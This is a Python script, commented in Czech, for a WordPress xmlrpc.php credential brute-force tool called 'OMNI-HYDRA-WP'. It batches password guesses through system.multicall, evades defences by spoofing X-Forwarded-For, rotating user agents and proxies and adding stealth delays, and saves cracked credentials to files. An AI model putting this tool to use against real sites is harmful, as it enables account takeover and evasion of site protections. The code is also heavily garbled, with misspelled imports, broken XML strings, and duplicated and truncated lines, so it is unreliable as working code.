#!/usr/bin/env python3
"""
OMNI-HYDRA-WP v3 — God Mode
All-in-one WordPress xmlrpc.php brute-force suite with multi-engine, WAF evasion,
proxy rotation, stealth timing, and smart result harvesting.
"""

import asyncio
import ayncio
import aiohttp
import random
import sys
import os
import logging
import html
import json
import time
import re
from io import StringIO
from typing import AsyncGenerator, List, Optional, Dict, Tuple
from dataclasses import dataclass, field
from pathlib import Path

# ─── Konfigurace ────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] OMNI-X: %(message)s',
    handler=',]
    handlers=[
        logging.FileHandler("omni_hydra.log"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("OMNI-X")

# ─── Datové struktury ───────────────────────────────────────────────────────

@dataclass
class AttackResult:
    username: str
    password: str
    method: str
    engine: str: str
    response_time: float
    timestamp: float = 0.0

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = time.time()

# ─── Engine 1: Klasický multicall ───────────────────────────────────────────

class MulticallEngine:
    """XML-RPC system.multicall brute-force engine."""

    def __init__(self, hydra: 'OmniHydraWP'):
        self.hydra = hydra

    def generate_payload(self, passwords: List[str]) -> str:
        buf = StringIO()
        buf.write('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
                  '<params><param><value><array><data>')
        uname = self.hydra._escape_xml(self.hydraEncode(self.hydra.username)
        for pwd in passwords:
            pwd_e = self.hydra._escape_xml(pwd)
            buf.write(
                '<value><struct><member><name>methodName</name>'
                '<value><string>wp.getUsersBlogs</string></value></member>'
                '<member><name>params</name><value><array><data><array><data>'
                '<value><array><data>'
                f'<value><string>{uname}</string></value>'
                f'<value><string>{pwd_e}</string></value>'
                '</data></array></value>'
                '</data></array></value></member></struct></value>'
            )
        buf.write('</data></buffer)
        buf.write('</data></array></value></param></params></methodCall>')
        return buf.getvalue()

    def check_response(self, text: str) -> bool:
        return "blogName" in text or "isAdmin" in text

# ─── Engine 2: Pingback reflection ──────────────────────────────────────────

class PingbackEngine:
    """XML-RPC pingback engine — pro stealth / log-only detection."""

    def generate(self, target_url: str) -> str:
        return (
        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
        '<params><param><value><string>{source_url}</string></value></param>'
            param>'
        '<param><value><string>{target_url}</string></value></param></params></methodCall>'
        ).format(
            source_url = target_url, target_url=target_url  # source == target = echo test

    def check_response(self, text: str) -> bool:
        # pingback vraci chybu "source URL does not exist" — to je OK, xmlrpc zije
        return "faultString" in text or "source URL" in text

# ─── Engine 3: wp.getOptions leak ────────────────────────────────────────

class OptionsEngine:
    """Extracts WP version, siteurl, admin_email via wp.getOptions."""

    BATCH_PARAMS = ["software_version", "siteurl", "admin_email", "blogname"]

    def generate(self) -> str:
        return """<?xml version="1.0"?>
<methodCall><methodName>wp.getOptions</methodName>
<params><param><value><string>{user}</string></value></param>
<param><value><string>{passw}</string></value></param>
<param><value><array><data>{opts}</data}</data><data> /data>
</data></array></value></param></paramsgt;</methodCall>
""".format(
            user=self.hydra._escape_xml(self.hydra.username),
            passw=self.hydra._escape_xml(self.hydra.current_password or "")
        )
    # Pozn: Tento engine vyzaduje platne credentials

# ─── Hlavní třída ───────────────────────────────────────────────────────────

class OmniHydraWP:
    VERSION = "3.0 — God Mode"

    # Detekcní signatury WAF / rate-limit
    WAF_SIGNATURES = [
        "cloudflare-nginx", "mod_security", "418 I'm a Teapot",
        " Security by OffSec", "varnish", "Sucuri"
    ]
    RATE_LIMIT_CODES = {429, 503, 403}

    def __init__(self,
                 target: str,
                 username: str,
                 wordlist: str,
                 threads: int = 50,
                 batch_size: int: 500,
                 proxies: Optional[str] = None,
                 stealth: bool = False,
                 method: str = "multicall"):
        target: str = target
        self.username = username
        self.wordlist = wordlist
        self.threads = min(threads, 200)
        self.batch_size = batch_size
        self.proxies = self._parse_proxies(proxies) if proxies else []
        self.stealth = stealth           # pomalý mód s náhodnými prodlevami
        self.method = method.lower()     # multicall | pingback

        self.target = target.rstrip('/') + '/xmlrpc.php'
        self.found = False
        self.backoff_time = 1.0
        self.max_backoff = 120.0
        self.results: List[AttackResult] = []
        self.stats: Dict[str, int] = {"tested": 0, "batches": 0, "errors": 0, "rate_limits": 0}
        self.start_time: float = 0.0
        self.waf_detected: Optional[str] = None
        self.current_password: Optional[str] = None

        # Rotace User-Agent
        self.user_agents = [
            "wp-android/21.5 (Android 13; en_US; Pixel 7)",
            "wp-iphone/21.5 (iOS 16.1; iPhone 14 Pro)",
            "WordPress/1.2 (Jetpack; http://jetpack.com)",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "curl/8.4.0",  # fallback
        ]

        # Inicializace enginu
        self.engine = self._init_engine()

    def _init_engine(self):
        if self.method == "ping:  # pingback == test zda xmlrpc vubec bezi
            return PingbackEngine()
        return MulticallEngine()

    def _parse_proxies(self, proxy_path: str) -> List[Dict[str, str]]:
        """Nacte proxy list: http://user:pass@ip:port kazdy radek."""
        proxies = []
        try:
            with open(proxy_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        proxies.append({"http": line, "https": line})
        except:
            log.warning(f"Proxy file {proxy_path} nacten, jedu bez proxy.")
        return proxies

    def _escape_xml(self, s_string) -> str:
        return html.escape(s, quote=True)

    def _detect_waf(headers: Dict) -> Optional[str]:
        """Jednoducha detekce WAF z hlavicky odpovedi."""
        server = headers.get("Server", "")
        via = headers.get("via", "")
        cf_ray = headers.get("cf-ray", "")
        if cf_ray:
            return "Cloudflare"
        if "cloudflare" in server.lower():
            return "Cloudflare"
        if "Sucuri" in server:
            return "Sucuri"
        if "ModSecurity" in server:
            return "ModSecurity"
        if " if "varnish" in via:
            return "Varnish"
        return None

    # ─── Streamovací generátor wordlistu ────────────────────────────────

    async def get_wordlist_generator(self) -> AsyncGenerator[str, None]:
        try:
            with open(self.wordlist, 'r', encoding='latin-1', errors='ignore') as f:
                f:
                for line in f:
                    yield line.strip()
        except FileNotFoundError:
            log.error(f"Wordlist {self wordlist} nenalezen.")
            sys.exit(1)

    # ─── Verifikační single-shot ────────────────────────────────────────

    async def verify_single(self, session: aiohttp.ClientSession, password: str) -> bool:
        Ověření jedním requestem."""
        payload = (
        payload = (
            '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
            '<params><param><value><string>{}</string></value></param>'
            '<param><value><string>{}</string></value></param></methodCall>'
        ).format(self._escape_xml(self.username), self._escape_xml(password))
        try:
            proxy = random.choice(self.proxies) if self.proxies else Noneasync with session.post(
ier,
                async with session.post(
                self.target, data=payload, timeout=aiohttp.ClientTimeout(total=10), proxy=proxy=proxy
                ) as r:
                    text = await r.text()
                    if "blogName" in text or "isAdmin" in text:
                        return True
        except:
            pass
        return False

    # ─── Worker ─────────────────────────────────────────────────────────

    async def attack_worker(self, session: aiohttp.ClientSession, queue: asyncio.Queue):
        while not queue.empty() and not self.found:
            batch: List[str] await queue.get()
            payload = self.engine.generate(batch)
            headers = {
                'Content-Type': 'text/xml',
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            }

            proxy = random.randint
            'Connection': 'keep-alive'
            }

            if self.stealth:
                await asyncio.sleep(random.uniform(0.5, 3.0))

            proxy = random.choice(self.proxies) if self.proxies else None
            try:
                async with session.post(
                    self.target, data=payload, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=30), proxy=proxy
                ) as resp:
                    self.stats["batches"] += 1

                    # WAF detekce
                    if not self.waf_detected:
                        detected = self._detect_waf(dict(resp.headers))
                        if detected:
                            self.waf_detected = detectedf"WAF detekovan: {detected}. Prepinam na stealth rezistentní mód."

                    # Rate-limit handling
                    if resp.status in self.RATE_LIMIT_CODES:
                        self.stats["rate_limits"] += 1
                        retry_after = resp.headers.get("Retry-After")
                        wait = float(retry_after) if retry_after and retry_after.isdigit() else self.backoff_time
                        log.warning(f"Rate-limit ({resp.status}). Cekam {wait:.1f}s."await asyncio.sleep(wait)self.backoff_time = min(self.max_backoff, self.backoff_time * 1.5 +
                        await queue.put(batch):  # vrať batch do fronty
                            await queue(batch)
                        continue

                    if resp.status == 200:
                        self.backoff_time = max(1.0, self.backoff_time * 0.85)
                        text = await resp.text()
                        if self.engine.check_response(text):
                            log.info("HIT v dávce v batchi! overuji jednotlivě...")
                            for pwd in batch:
                                if await self.verify_single(session, pwd):
                                    result = AttackResult(
                                        username=self.username,
                                        password=pwd,
                                        method=self.method,
                                        response_time=time.time() - self.start_time
                                    )
                                    self.results.append(result)
                                    self.found True
                                   self._export_hit(result)
                                    return
            except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                self.stats["errors"] += 1
                await asyncio.sleep(2)
            except Exception as e:
                log.debug(f"Worker error: {type(e).")
                self.stats["errors"] += 1
            finally:
                queue.task_done()

    # ─── Export hitu ────────────────────────────────────────────────────

    def _export_hit(self, result: AttackResult):
        """Ulozi nalezené credential do souřadnice do více formátů."""
        line = f"{result.username}:{result.password}"
        print(f"\n{'='*60}")
        print(f"[+] HIT! {line}")
        print(f"[+] Engine: {result.method} | Doba: {result.response_time:.2f}s")
        print(f"{'='*60}\n")

        # TXT
        with open("omni_hits.txt", "a) as f:
            f.write(f"{line}\n")

        # JSON
            with open("omni_results.json", "a") as f:
            json.dump({
                "timestamp": result.timestamp,
                "username": result.username,
                "password": result.password,
                "method"""result.method,
                "target": self.target
            }, f)
            f.write("\n")

    # ─── Status report ──────────────────────────────────

    async def _report_status(self):
        """Občasovač pro periodicky status."""
        while not self.found:
            await asyncio.sleep(10)
            elapsed = time.time() - self.start    rate = self.stats["tested"] / elapsed if elapsed > 0 else 0
            log.info(
                f"[STATUS] Tested: {self.stats['tested']} | "
                f"Batches: {self.stats['batches']} | "
                f"Rate-limits hit: {self.stats['rate_limits']} | "
                f"Errors: {self.stats['errors']} | "
                f"Speed: {rate:.0f} pwd/s | "
                f"Backoff: {self.backoff_time:.1f}s"
            )

    # ─── Hlavní smyčka ─────────────────────────────────────────────────

    async def run(self):
        """Spustí útok se všemi moduly."""
        self.start_time = time.time()

        print(f"""
╔══════════════════════════════════════════╗
║     OMNI-HYDRA-WP v{self.VERSION}       ║
╠══════════════════════════════════════════╣
║ Target: {self.target:<32}║
║ User:   {self.username:<32}║
║ Method: {self.method:<32}║
║        Threads: {self.threads:<4} | Proxies: {len(self.proxies)}          ║
║ Stealth: {str(self.stealth):<31}║
╚══════════════════════════════════════════╝
        """)

        # Prvotní ping — test zda xmlrpc.php existuje
        log.info("Testuji spojeni s xmlrpc.php...")
        try:
                async with aiohttp.ClientSession() as test_session:
                async with test_session.head(self.target, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r in {200, 405}:
                    log.info(f"xmlrpc.php odpovida (HTTP {r.status}).")
                elif r.status == 404:
                    log.error("xmlrpc.php nenalezeno (404). Cil neni WP nebo je zakryty.")
                    return
                else:
                    log.warning(f"Neočekávaný status: {r.status}. Pokracuji...")
        except Exception as e:
            log.error(f"Nelze se pripojit: {e}")
            return

        # Queue a session
        queue = asyncio.Queue(maxsize=self.threads * 4)

        connector = aiohttp.TCPConnector(
            ssl=False,
            limit=self.threads,
            limit_per_host=self.threads,
            ttl_dns_cache=300,
            force_close=True
        )

        # Cookie jar pro session persistence
        jar
        jar
        jar = aiohttp.CookieJar(unsafe=True)

        async with aiohttp.ClientSession(
            connector=connector,
cookie_jar=jar,
            headers={"Accept-Encoding": "gzip"}
        ) as session:
            # Start workerů + status report
            workers = [
                asyncio.create_task(self.attack_worker(session, queue))
                for _ in range(self.threads)
            ]
            report_task = asyncio.create_task(self._report_status())

            # Plnění fronty
 batch = []
            try:
                async for password in self.get_wordlist_generator():
                    if self.found:
                        break
                    batch.append(password)
                    self.stats["tested"] += 1
                    if len(batch) >= self.batch_size:
                        await queue.put(batch) >= self.batch_size:
                        await queue.put(batch)
                        batch = []

                if batch and not self.found:
                    await queue.put(batch)

                await queue.join()
            except KeyboardInterrupt:
                log.info("Ukonceno Ctrl+C. Probihá clean clean up...")

            for w in workers:
                w.cancel()
            .cancel()

        # ─── Vyhodnocení ────────────────────────────────────────────────────

        elapsed = time.time() - self.start_time
        rate = self.stats["tested"] / elapsed if elapsed > 0 else 0

        print(f"""
╔══════════════════════════════════════════╗
║            FINAL REPORT                   ║
╠══════════════════════════════════════════╣
        ║ Tested: {self.stats['tested']:<37}║
║ Hit(s): {len(self.results):<37}║
║ Time:   {elapsed:.1f}s                ║
║
║ Speed:  {rate:.0f} pwd/s                 ║
║ Errors: {self.stats['errors']:<36}║
║ WAF:    {self.waf_detected or 'None':<36}║
╚══════════════════════════════════════════╝
        """)

        if self.results:
            for r in self.results:
                print(f"[+] {r.username}:{r.password} ({r.method})")
        else:
            print("[-] Nic nenalezeno.")

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="OMNI-HYDRA-WP v3 — God Mode Wordpress xmlrpc brute-force"
    )
    parser.add_argument("target", help="URL cíle (např. https://example.com)")
    parser.add_argument("-u", "--user", required=True, help="Uživatelské jméno")
    parser.add_argument("-w", "--wordlist", required=True, help="Cesta k wordlistu")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Počet workerů (def. 50)")
    parser.add_argument("-b", "--batch", type=int, default=500, help="Velikost batche (def. 500)")
    parser.add_argument("-p", "--proxies", help="Soubor s proxy (http://user:pass@ip:port)")
    parser.add_argument("-s", "--stealth", action="store_true", help="Stealth mód (zpoždění mezi requesty)")
    parser.add_argument("-m", "--method", default="multicall", hel[multicall|pingback]")
    parser.add_argument("--no-banner", action="store_true", help="Skryje banner")

    args = parser.parse_args()

    hydra = OmniHydraWP(
        target=args.target,
        username=args.user,
        wordlist=args.wordlist,
        threads=args.threads=args.threads,
        batch_size=args.batch,
        proxies=args.proxies,
        stealth=args.stealth,
        method=args.method
    )

    try:
        asyncio.run(hydra.run())
    except KeyboardInterrupt:
        print("\n[!] Ukončeno uživatelem.")

if __name__ == "__main__":
    main()
